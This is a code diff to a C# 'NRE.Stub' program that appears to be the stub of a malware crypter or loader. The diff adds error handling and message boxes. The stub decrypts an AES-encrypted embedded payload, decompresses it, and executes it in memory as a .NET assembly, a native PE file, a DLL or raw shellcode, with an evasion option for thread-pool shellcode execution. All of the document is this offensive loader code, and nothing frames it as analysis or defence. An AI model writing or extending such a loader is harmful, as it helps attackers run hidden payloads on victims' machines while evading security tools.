@@ -61,32 +61,70 @@ namespace NRE.Stub
 
             var key = EmbeddedData.Key;
             var iv = EmbeddedData.IV;
-            var decrypted = AesDecryptor.Decrypt(encrypted, key, iv);
+            if (key == null || key.Length != 32 || iv == null || iv.Length != 16)
+            {
+                try { MessageBoxW(IntPtr.Zero, "Invalid key/IV.", "NRE", 0x10); } catch { }
+                return;
+            }
+
+            byte[] decrypted;
+            try
+            {
+                decrypted = AesDecryptor.Decrypt(encrypted, key, iv);
+            }
+            catch (Exception ex)
+            {
+                try { MessageBoxW(IntPtr.Zero, "Decrypt failed: " + (ex.InnerException ?? ex).Message, "NRE", 0x10); } catch { }
+                return;
+            }
+
+            if (decrypted == null || decrypted.Length == 0)
+                return;
 
             if (EmbeddedData.CompressionFormat != CompressionFormat.None)
-                decrypted = Decompress.DecompressBuffer(decrypted, EmbeddedData.CompressionFormat);
-
-            switch (EmbeddedData.PayloadType)
             {
-                case PayloadType.DotNetAssembly:
-                    DotNetLoader.LoadAndExecute(decrypted);
-                    break;
-                case PayloadType.NativeExe:
-                    NativePELoader.LoadAndExecute(decrypted, isDll: false);
-                    break;
-                case PayloadType.NativeDll:
-                    NativePELoader.LoadAndExecute(decrypted, isDll: true);
-                    break;
-                case PayloadType.RawShellcode:
-                default:
-                    if ((evasion & EvasionOptions.ExecuteThreadPool) != 0)
-                    {
-                        Threadpool.QueueShellcode(decrypted);
-                        System.Threading.Thread.Sleep(System.Threading.Timeout.Infinite);
-                    }
-                    else
-                        ShellcodeLoader.Execute(decrypted);
-                    break;
+                try
+                {
+                    decrypted = Decompress.DecompressBuffer(decrypted, EmbeddedData.CompressionFormat);
+                }
+                catch (Exception ex)
+                {
+                    try { MessageBoxW(IntPtr.Zero, "Decompress failed: " + (ex.InnerException ?? ex).Message, "NRE", 0x10); } catch { }
+                    return;
+                }
+            }
+
+            if (decrypted == null || decrypted.Length == 0)
+                return;
+
+            try
+            {
+                switch (EmbeddedData.PayloadType)
+                {
+                    case PayloadType.DotNetAssembly:
+                        DotNetLoader.LoadAndExecute(decrypted);
+                        break;
+                    case PayloadType.NativeExe:
+                        NativePELoader.LoadAndExecute(decrypted, isDll: false);
+                        break;
+                    case PayloadType.NativeDll:
+                        NativePELoader.LoadAndExecute(decrypted, isDll: true);
+                        break;
+                    case PayloadType.RawShellcode:
+                    default:
+                        if ((evasion & EvasionOptions.ExecuteThreadPool) != 0)
+                        {
+                            Threadpool.QueueShellcode(decrypted);
+                            System.Threading.Thread.Sleep(System.Threading.Timeout.Infinite);
+                        }
+                        else
+                            ShellcodeLoader.Execute(decrypted);
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                try { MessageBoxW(IntPtr.Zero, "Load/execute failed: " + (ex.InnerException ?? ex).Message, "NRE", 0x10); } catch { }
             }
         }
     }
